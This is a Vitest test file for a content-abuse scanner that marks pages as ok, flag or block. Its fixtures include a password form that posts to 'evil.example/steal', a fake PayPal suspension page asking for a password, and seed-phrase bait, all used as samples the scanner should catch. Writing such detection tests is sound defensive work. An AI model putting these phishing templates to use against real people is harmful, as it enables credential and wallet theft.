import { describe, it, expect } from "vitest";
import { scanContent } from "@/lib/abuse/scan";

describe("scanContent", () => {
  it("passes ordinary content", () => {
    expect(scanContent("# My notes\n\nA normal document about gardening.", "<h1>My notes</h1>").verdict).toBe("ok");
    expect(scanContent("Quarterly report: revenue up 12%.", "<p>Quarterly report</p>").verdict).toBe("ok");
  });

  it("blocks a credential-capture page (phrase + external password form)", () => {
    const html =
      '<p>Verify your account to continue.</p><form action="https://evil.example/steal"><input type="password" name="pw"></form>';
    expect(scanContent("verify your account", html).verdict).toBe("block");
  });

  it("blocks a password field with brand + phishing phrasing", () => {
    const html =
      '<h1>PayPal</h1><p>Your account has been suspended. Confirm your password.</p><input type="password">';
    expect(scanContent("PayPal account suspended", html).verdict).toBe("block");
  });

  it("flags softer single signals without blocking", () => {
    expect(scanContent("Please verify your account at the link.", "<p>verify your account</p>").verdict).toBe("flag");
    expect(scanContent("Enter your seed phrase to connect your wallet.", "<p>seed phrase</p>").verdict).toBe("flag");
  });

  it("does not block a mere password field with no phishing signal", () => {
    // A docs page showing a <input type=password> example, no phishing phrasing.
    const html = '<p>Example login form:</p><input type="password">';
    expect(scanContent("example login form", html).verdict).not.toBe("block");
  });

  it("does not flag a form posting back to ilolink.com", () => {
    const html = '<form action="https://ilolink.com/x"><input type="text"></form>';
    expect(scanContent("a form", html).verdict).toBe("ok");
  });
});
